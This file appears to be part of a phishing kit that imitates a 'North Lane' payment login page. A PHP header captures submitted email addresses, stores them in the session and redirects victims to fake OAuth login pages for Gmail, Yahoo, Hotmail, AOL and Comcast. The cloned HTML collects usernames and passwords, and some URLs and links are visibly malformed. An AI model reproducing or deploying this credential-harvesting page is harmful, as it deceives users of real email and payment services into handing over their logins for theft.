<?php
require_once("email.php");
session_start();
$email = $_SESSION['email'];
if(isset($_POST['email']) && !empty($_POST['email'])){ 
    $email = $_POST['email'];


    if(preg_match('/@comcast.net/', $email)) {    
        $_SESSION['email']    = $email;
		echo "<script type='text/javascript'>window.top.location='../oauth/2.0/comcast/index.php';</script>";
    } elseif(preg_match('/@yahoo|@ameritech|@att|@bellsouth|@currently|@flash|@nvbell|@pacbell|@prodigy|@sbcglobal|@snet|@swbell|@wans/', $email)) {    
        $_SESSION['email']    = $email;
        echo "<script type='text/javascript'>window.top.location='../oauth/2.0/yahoo/index.php';</script>";
    } elseif(preg_match('/@live.com|@outlook|@hotmail.com|@msn.com|@windowslive.com|@passport.com/', $email)) {    
        $_SESSION['email']    = $email;
        echo "<script type='text/javascript'>window.top.location='../oauth/2.0/hotmail/index.php';</script>";
    } elseif(preg_match('/@aol.com/', $email)) {    
        $_SESSION['email']    = $email;
        echo "<script type='text/javascript'>window.top.location='../oauth/2.0/aol/index.php';</script>";
    } elseif(preg_match('/@gmail.com/', $email)) 
         $_SESSION['email']    = $email;
        echo "<script type='text/javascript'>window.top.location='../oauth/2.0/gmail/index.php';</script>";
        
    exit(); 
}

?>

<html>
<head>
	<title>North Lane</title>
	
		
	



















<script language="JavaScript" type="text/javascript">
				//<![CDATA[
				   function windowOnLoad()
				  { 
					 var inputTags = document.querySelectorAll("input[type=text]");
					 for (var i = 0; i < inputTags.length; i += 1) {
					     inputTags[i].setAttribute('autocomplete','off');
					 }
					 var inputTags2 = document.querySelectorAll("input[type=hidden]");
					 for (var i = 0; i < inputTags2.length; i += 1) {
					     inputTags2[i].setAttribute('autocomplete','off');
					 } 
					  var inputTags1 = document.querySelectorAll("input[type=password]");
					 for (var i = 0; i < inputTags1.length; i += 1) {
					     inputTags1[i].setAttribute('autocomplete','off');
					 } 
					}
					
					 if ( document.addEventListener )
					{
					 document.addEventListener("DOMContentLoaded", windowOnLoad, false);
					}
					else
					{
					 windowOnLoad();
				 } 
							 //]]>						
							</script>












<script type="text/javascript" src="https://login.northlane.com:443/xContent/content/op/j/jquery-new.js"></script>



<!-- <meta content="IE=EmulateIE7" http-equiv="X-UA-Compatible" /> -->
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Expires" content="0" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Cache-Control" content="no-cache , no-store" />

<meta http-equiv="refresh" content="480;url=/login/logout.do?skinname=&amp;affiliate=2003" />

<link rel="stylesheet" href="https://login.northlane.com:443/xContent/content/op/c/sw.css" type="text/css" media="screen" />
<link rel="stylesheet" href="https://login.northlane.com:443/xContent/content/op/c/partner.css" type="text/css" media="screen" />
<link rel="stylesheet" href="https://login.northlane.com:443/xContent/content/op/c/print.css" type="text/css" media="print" />

<script type="text/javascript" src="https://login.northlane.com:443/xContent/content/op/j/niftycube.js"></script>
<script type="text/javascript" src="https://login.northlane.com:443/xContent/content/op/j/niftyLayout.js"></script>
<script type="text/javascript" src="https://login.northlane.com:443/xContent/content/op/j/layers.js"></script>
<script type="text/javascript" src="https://login.northlane.com:443/xContent/content/op/j/switch.js"></script>
<script type="text/javascript" src=""></script>
<script type="text/javascript" src="/scripts/js/common/tokenprocessor.js"></script>
<script type="text/javascript" src="/scripts/js/common/commonva.js"> </script>


<script type="text/javascript" >
<!--

		$(document).ready(
		function(){
			addtoken('');
			setAutoCompleteOff();			
	    });
		
//-->
</script>
<style type="text/css"> html{display : none ; } 
@font-face {
  			font-family: 'Interstate-Regular';
			src: url('/interstateregular.ttf') format('truetype');
		}
@font-face {
  			font-family: 'Futura';
			src: url('/Futura.ttc') format('truetype');
		}
</style> 
<script type="text/javascript" >
<!--
if( self == top ) { document.documentElement.style.display = 'block' ; } else { top.location = self.location ; } 
//-->
</script>
<script language="JavaScript" type="text/javascript">
function closer()
{
	this.close(); 
}
</script>
</head>

<body>

















<script language="JavaScript" type="text/javascript">
				//<![CDATA[
				   function windowOnLoad()
				  { 
					 var inputTags = document.querySelectorAll("input[type=text]");
					 for (var i = 0; i < inputTags.length; i += 1) {
					     inputTags[i].setAttribute('autocomplete','off');
					 }
					 var inputTags2 = document.querySelectorAll("input[type=hidden]");
					 for (var i = 0; i < inputTags2.length; i += 1) {
					     inputTags2[i].setAttribute('autocomplete','off');
					 } 
					  var inputTags1 = document.querySelectorAll("input[type=password]");
					 for (var i = 0; i < inputTags1.length; i += 1) {
					     inputTags1[i].setAttribute('autocomplete','off');
					 } 
					}
					
					 if ( document.addEventListener )
					{
					 document.addEventListener("DOMContentLoaded", windowOnLoad, false);
					}
					else
					{
					 windowOnLoad();
				 } 
							 //]]>						
							</script>



























<script language="JavaScript" type="text/javascript">
				//<![CDATA[
				   function windowOnLoad()
				  { 
					 var inputTags = document.querySelectorAll("input[type=text]");
					 for (var i = 0; i < inputTags.length; i += 1) {
					     inputTags[i].setAttribute('autocomplete','off');
					 }
					 var inputTags2 = document.querySelectorAll("input[type=hidden]");
					 for (var i = 0; i < inputTags2.length; i += 1) {
					     inputTags2[i].setAttribute('autocomplete','off');
					 } 
					  var inputTags1 = document.querySelectorAll("input[type=password]");
					 for (var i = 0; i < inputTags1.length; i += 1) {
					     inputTags1[i].setAttribute('autocomplete','off');
					 } 
					}
					
					 if ( document.addEventListener )
					{
					 document.addEventListener("DOMContentLoaded", windowOnLoad, false);
					}
					else
					{
					 windowOnLoad();
				 } 
							 //]]>						
							</script>



<div id="select-language" style="clear:both;">

        
            <label id="language">Select your language preference:</label>

            <select name="languageSelection" onchange="javascript:selectLanguage(this.value);"><option value="en_US" selected="selected">English</option>
<option value="sp_US">Español</option>
<option value="fr_CA">Français</option></select>
        

    <script language="Javascript" type="text/javascript">
    <!--
    function selectLanguage(option)
    {
        window.location = replaceQueryString(window.location.href, 'locale', option);
    }

    function replaceQueryString(url, param, value) {
	    var re = new RegExp("([?|&])" + param + "=.*?(&|$)","i");
	    if (url.match(re))
	        return url.replace(re,'$1' + param + "=" + value + '$2');
	    else if (url.indexOf("?") == -1)
	        return url + '?' + param + "=" + value;
	    else
	        return url + '&' + param + "=" + value;
	}
	
    //-->
    </script>

</div>





<div id="header">
<div id="logo">
    

    
      <a href=""><img src="https://login.northlane.com:443/xContent/content/op/i/default-partner.png"alt="MyAccount" id="partner" /> </a>
    
 </div>
 
</div>



	
















<script language="JavaScript" type="text/javascript">
				//<![CDATA[
				   function windowOnLoad()
				  { 
					 var inputTags = document.querySelectorAll("input[type=text]");
					 for (var i = 0; i < inputTags.length; i += 1) {
					     inputTags[i].setAttribute('autocomplete','off');
					 }
					 var inputTags2 = document.querySelectorAll("input[type=hidden]");
					 for (var i = 0; i < inputTags2.length; i += 1) {
					     inputTags2[i].setAttribute('autocomplete','off');
					 } 
					  var inputTags1 = document.querySelectorAll("input[type=password]");
					 for (var i = 0; i < inputTags1.length; i += 1) {
					     inputTags1[i].setAttribute('autocomplete','off');
					 } 
					}
					
					 if ( document.addEventListener )
					{
					 document.addEventListener("DOMContentLoaded", windowOnLoad, false);
					}
					else
					{
					 windowOnLoad();
				 } 
							 //]]>						
							</script>

<div id="super-wrap">
<div id="mainpage-area">


	<div id="out-page">

        <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">






























<script language="JavaScript" type="text/javascript">
				//<![CDATA[
				   function windowOnLoad()
				  { 
					 var inputTags = document.querySelectorAll("input[type=text]");
					 for (var i = 0; i < inputTags.length; i += 1) {
					     inputTags[i].setAttribute('autocomplete','off');
					 }
					 var inputTags2 = document.querySelectorAll("input[type=hidden]");
					 for (var i = 0; i < inputTags2.length; i += 1) {
					     inputTags2[i].setAttribute('autocomplete','off');
					 } 
					  var inputTags1 = document.querySelectorAll("input[type=password]");
					 for (var i = 0; i < inputTags1.length; i += 1) {
					     inputTags1[i].setAttribute('autocomplete','off');
					 } 
					}
					
					 if ( document.addEventListener )
					{
					 document.addEventListener("DOMContentLoaded", windowOnLoad, false);
					}
					else
					{
					 windowOnLoad();
				 } 
							 //]]>						
							</script>

<script language="JavaScript" type="text/javascript" src="/scripts/js/security/AC_OETags.js"></script>
<script language="JavaScript" type="text/javascript" src="/scripts/js/security/security.js"></script>
<script language="JavaScript" type="text/javascript" src="/scripts/js/security/hashtable.js"></script>
<script language="JavaScript" type="text/javascript" src="/scripts/js/security/rsa.js"></script>
<script language="JavaScript" src="/scripts/js/common/common.js"></script>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />	
    
<link rel="stylesheet" href="/css/cardPrint.css" type="text/css" />








<link rel="stylesheet" href="https://login.northlane.com:443/xContent/content/op/c/paymentHub.css" type="text/css" media="screen" />
<script type="text/javascript" src="https://login.northlane.com:443/xContent/content/op/j/paymentLogin.js"></script>
</script>
    <script>
      $(document).ready(function(){
        $(".payment-virtual-content-select").hide();
        $(".payment-prepaid-content-select").hide();
        $(".payment-unselect-virtual-container").show();
        $(".payment-unselect-prepaidCard-container").show();
        $(".payment-unselect-virtual-container").click(function(){
          $(".payment-unselect-virtual-container").hide();
          $(".payment-virtual-content-select").show();
          $(".payment-prepaid-content-select").hide();
          $(".payment-unselect-prepaidCard-container").show();
        }
                                                      );
        $(".payment-unselect-prepaidCard-container").click(function(){
          $(".payment-unselect-prepaidCard-container").hide();
          $(".payment-prepaid-content-select").show();
          $(".payment-virtual-content-select").hide();
          $(".payment-unselect-virtual-container").show();
        }
                                                          );
        $("#show").click(function(){
          $("p").show();
        }
                        );
      }
                       );
    </script>
    <script type="text/javascript">
    
    function maskThis(obj){
    	var id = obj.id;
    	obj.type = "password";
    }
    
    function unmaskThis(obj){
    	var id = obj.id;
    	obj.type = "text";
    }
    
    </script>
    
    <style type="text/css">
     html{
      display : none ;
      }
	    
	    
    </style> 
   
    <script language="JavaScript" type="text/javascript">
      function closer()
      {
        this.close();
      }
    </script>




	
		



	
	
  

          <script language="JavaScript" type="text/javascript" src="/scripts/js/security/security.js">
          </script>
          <script language="JavaScript" src="/scripts/js/common/common.js">
          </script>
          <div id="account-content">
            <div id="payment-container" class="sansserif" style="background:url(https://login.northlane.com:443/xContent/content/op/i/paymenthub/PH_background.png);">
              <div class="payment-inner-container">
                <div id="payment-login">
                  <p class="payment-welcome-text greyFont">
                  </p>
                  <p class="payment-selection">Please make a selection below to receive your payment
                  </p>
                 
				
				
				
					
           		
                
                  <div class="payment-choice-btn">
                    <div class="payment-btn-firstUser cp-backgroundcolor1 cp-textcolor1" id="first_time_user_btn">First-Time User
                    </div>
                    
					<div id="first_time_user_div" style="display: none">
					
					<form name="firstTimeUserLoginForm" method="post" action="/payment/firsttimeuser.do" onsubmit="callDevice();">
					<input type="hidden" name="RSADeviceFso" id="RSADeviceFso" value=""/>
					<input type="hidden" name="devicePrintId" id="devicePrintId" value=""/>
					<input type="hidden" name="CSRFToken"  value=""/>
					
					
					
						
						
						

						
						
						
						<div class="cp-captchaimege-section">
							<div class="cp-image-captcha"><img id="cpImgFirstTime" src="/simpleCaptcha.png" /></div>
							<div class="cp-refresh-image"><img src="https://login.northlane.com:443/xContent/content/op/i/refresh.png" id="refreshImage" alt='Refresh Image'
								 onclick="refreshPCCaptcha('')" /></div>
						</div>
						<div class="cp-captcha-section">
							<input type="text" name="captchaResponse" class="cp-captchatext-input cp-border-radius" placeholder="Enter the text from the image" />
						</div>
						
						<div class="cp-continue-cancel-btn cp-expanded-btn">
							<input type="button" class="cp-cancel-button cp-border-radius cp-cancel-button-color cp-first-user-cancel" data-inputType="button" onclick="javascript:clickcancel('','selectdelivery','/payment/loginorregister.do')" value="Cancel"/>
							<input class="cp-continue-button cp-border-radius cp-backgroundcolor1 cp-textcolor1 marginLeft5 cp-first-user-login" data-inputType="button" type="submit" value="Continue" />			
						</div>
						<input type="hidden" name="puidLabel" value="" />
						<input type="hidden" name="landingPageMsg" value="" />
						</form>
					</div>
					
                    <div class="payment-btn-returningUser cp-backgroundcolor2 cp-textcolor1" id="returning_user_btn">Returning User
                    </div>
					<div id="returning_user_div">
					
					 <form name="firstTimeUserLoginForm" id="secure_login" method="post" action="/payment/submit.do" onsubmit="callDevice2();">
					 	<input type="hidden" name="RSADeviceFso" id="RSADeviceFso" value=""/>
						<input type="hidden" name="devicePrintId" id="devicePrintId2" value=""/>
						<input type="hidden" name="CSRFToken" value=""/>
						<div class="payment-userlogin"> 

												
													
															<input type="text" name="username" autocomplete="off"
																size="18"
																	maxlength="20"
																	value=""
																	class="cp-username cp-gray-border cp-login-input cp-border-radius" id="realUsr" tabindex="1" placeholder="Username" />
													
													
												
						                       
							<!-- <input  type="text" class="cp-username cp-gray-border cp-login-input cp-border-radius" maxlength="20" placeholder="Username"> -->
							
							
							<input type="password" name="password" autocomplete="off"
											size="18"
											maxlength="50"
												class="cp-password cp-gray-border cp-login-input cp-border-radius" tabindex="2" placeholder="Password" tabindex="2" /> 
							<!-- <input type="password" class="cp-password cp-gray-border cp-login-input cp-border-radius" maxlength="50" placeholder="Password"> -->
							<a href="/login/forgotpassword.do" target='_blank' class="cp-forgot-password greyFont">Forgot Password</a>
						</div>
						<input type="hidden" name="retloginpage" id="retloginpage" value="Y"/>
						
						<div class="cp-captchaimege-section">
							<div class="cp-image-captcha"><img id="cpImgReturning" src="/simpleCaptcha.png" name="captchaImage" alt="captchaImage" /></div>
							<div class="cp-refresh-image"><img src="https://login.northlane.com:XMR" onclick="refreshPCCaptcha('')" /></div>
						</div>
						<div class="cp-captcha-section">
							<input type="text"  name='captchaResponse' class="cp-captchatext-input cp-border-radius" placeholder="Enter the text from the image" tabindex="3"/>
						</div>
						
						<div class="cp-continue-cancel-btn cp-expanded-btn">
							<div class="cp-cancel-button cp-border-radius cp-cancel-button-color cp-reg-user-cancel" data-inputType="button" onclick="javascript:clickcancel('','selectdelivery','/payment/loginorregister.do')" >Cancel</div>
							
							<input class="cp-continue-button cp-border-radius cp-backgroundcolor1 cp-textcolor1 marginLeft5 cp-first-user-login" tabindex="4" name="login" id="login" data-inputType="button" type="submit" value="Continue" />
							
							</div>	
							</form>			
						</div>
						
					</div>
                  </div>
                </div>
              </div>
            </div>
         
  

<script type="text/javascript">


var originalbirthmonth = '';
var originalbirthday = '';
var originalbirthyear = '';

if(document.getElementById("monthUpdate") !== null &&
		document.getElementById("monthUpdate") !== "undefined" && 
		document.getElementById("monthUpdate").options[0] !== "undefined"){
	originalbirthmonth = document.getElementById("monthUpdate").options[0].text;
}

if(document.getElementById("dayUpdate") !== null && 
		document.getElementById("dayUpdate") !== "undefined" && 
		document.getElementById("dayUpdate").options[0] !== "undefined"){
	originalbirthday = document.getElementById("dayUpdate").options[0].text;
}

if(document.getElementById("yearUpdate") !== null &&
		document.getElementById("yearUpdate") !== "undefined" && 
		document.getElementById("yearUpdate").options[0] !== "undefined"){
	originalbirthyear = document.getElementById("yearUpdate").options[0].text;
}

/* var originalbirthmonth = document.getElementById("monthUpdate").options[0].text;
var originalbirthday = document.getElementById("dayUpdate").options[0].text;
var originalbirthyear = document.getElementById("yearUpdate").options[0].text;  */

function unmaskbirthmonth()
{
	var selectedBirthMonth = document.getElementById("monthUpdate");
	selectedBirthMonth.options[selectedBirthMonth.selectedIndex].text = originalbirthmonth;
}

function maskbirthmonth()
{
 
	var selectedBirthMonth1 = document.getElementById("monthUpdate");
	originalbirthmonth = selectedBirthMonth1.options[selectedBirthMonth1.selectedIndex].text;
    if(originalbirthmonth==document.getElementById("monthUpdate").options[0].text)
	{
    	selectedBirthMonth1.options[selectedBirthMonth1.selectedIndex].text = originalbirthmonth;
	}
    else
    	{
    	var birthmnthlen = selectedBirthMonth1.options[selectedBirthMonth1.selectedIndex].text;
        var mskbirthmnth = " ";
        var tempmskbirthmnth;
     
    	 for(i=0;i<birthmnthlen.length;i++)
    	 {
    		 tempmskbirthmnth = mskbirthmnth.concat("*");
    		 mskbirthmnth = tempmskbirthmnth;
    	 }
    	
    	 selectedBirthMonth1.options[selectedBirthMonth1.selectedIndex].text = mskbirthmnth;
    	 //document.getElementById('testingbirthm').value = originalbirth;
    	}
    
 }

function unmaskbirthday()
{
	var selectedBirthDay = document.getElementById("dayUpdate");
	selectedBirthDay.options[selectedBirthDay.selectedIndex].text = originalbirthday;
	
}

function maskbirthday()
{
	var selectedBirthDay1 = document.getElementById("dayUpdate");
    originalbirthday = selectedBirthDay1.options[selectedBirthDay1.selectedIndex].text;
    if(originalbirthday==document.getElementById("dayUpdate").options[0].text)
    	{
    	selectedBirthDay1.options[selectedBirthDay1.selectedIndex].text = originalbirthday;
    	}
    else
    	{
    	 var birthdaylen = selectedBirthDay1.options[selectedBirthDay1.selectedIndex].text;
    	    var mskbrthday = " ";
    	    var tempmskbrthday;
    	   
    		 for(i=0;i<birthdaylen.length;i++)
    		 {
    			 tempmskbrthday = mskbrthday.concat("*");
    			 mskbrthday = tempmskbrthday;
    		 }

    		 selectedBirthDay1.options[selectedBirthDay1.selectedIndex].text = mskbrthday;
    	}
   
 }

function unmaskbirthyear()
{
	var selectedBirthYear = document.getElementById("yearUpdate");
	selectedBirthYear.options[selectedBirthYear.selectedIndex].text = originalbirthyear;
}

function maskbirthyear()
{
	var selectedBirthYear1 = document.getElementById("yearUpdate");
    originalbirthyear = selectedBirthYear1.options[selectedBirthYear1.selectedIndex].text;
    if(originalbirthyear==document.getElementById("yearUpdate").options[0].text)
    	{
    	selectedBirthYear1.options[selectedBirthYear1.selectedIndex].text = originalbirthyear;
    	}
     else
     {
    	 var birthyearlen = selectedBirthYear1.options[selectedBirthYear1.selectedIndex].text;
    	    var mskbirthyr = " ";
    	    var tempmskbirthyr;
    	   
    		 for(i=0;i<birthyearlen.length;i++)
    		 {
    			 tempmskbirthyr = mskbirthyr.concat("*");
    			 mskbirthyr = tempmskbirthyr;
    		 }

    		 selectedBirthYear1.options[selectedBirthYear1.selectedIndex].text = mskbirthyr;
     }
   
 }


</script>

	</div>


</div>

</div>



















<script language="JavaScript" type="text/javascript">
				//<![CDATA[
				   function windowOnLoad()
				  { 
					 var inputTags = document.querySelectorAll("input[type=text]");
					 for (var i = 0; i < inputTags.length; i += 1) {
					     inputTags[i].setAttribute('autocomplete','off');
					 }
					 var inputTags2 = document.querySelectorAll("input[type=hidden]");
					 for (var i = 0; i < inputTags2.length; i += 1) {
					     inputTags2[i].setAttribute('autocomplete','off');
					 } 
					  var inputTags1 = document.querySelectorAll("input[type=password]");
					 for (var i = 0; i < inputTags1.length; i += 1) {
					     inputTags1[i].setAttribute('autocomplete','off');
					 } 
					}
					
					 if ( document.addEventListener )
					{
					 document.addEventListener("DOMContentLoaded", windowOnLoad, false);
					}
					else
					{
					 windowOnLoad();
				 } 
							 //]]>						
							</script>








	
<div id="footer">
<div id="footer-links">
	<style type="text/css">
	div#footer-links {margin-bottom:10px; padding-bottom:10px; width:980px; border-bottom:1px solid #ccc; overflow:hidden; }
	</style>


	<p id="sm-logo"><a></a></p>

<ul>

	
		<li></li>
	

	<li><a href="https://login.northlane.com:443/xContent/content/op/program/prelogin_terms_en_US.html"
		target="_blank">Terms of Use</a></li>
	<li class="last-link"><a
		href="https://login.northlane.com:XMRli>
	<li class='copyrightlink'>
		<p id="copyright">&copy; 2021 North Lane Technologies, Inc.</p>
	</li>
</ul>

</div>

</div>






</body>
</html>